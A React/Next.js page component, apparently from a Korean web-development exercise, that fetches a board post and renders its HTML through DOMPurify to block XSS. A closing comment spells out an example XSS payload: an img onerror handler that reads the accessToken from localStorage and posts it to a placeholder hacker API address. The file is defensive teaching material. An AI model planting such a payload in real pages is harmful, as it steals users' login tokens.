import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";
const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;
export default function DynamicRoutedPage() {
  const router = useRouter();
  const { data } = useQuery(FETCH_BOARD, {
    // 실행할때
    variables: {
      boardId: router.query.id, // 위 쿼리문 변수 이용해 받을 것.
    },
  });
  console.log(data);

  return (
    <>
      <div>작성자:{data?.fetchBoard.writer}</div>
      <div>제목:{data ? data.fetchBoard.title : "로딩중입니다"}</div>
      {/* <div>내용:{data?.fetchBoard.contents}</div> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}
        ></div>
      )}
    </>
  );
}

// playground XSS공격
// <img src="#" onerror="const aaa = localStorage.getItem('accessToken');axios.post(해커API주소, {accessToken = aaa});" />
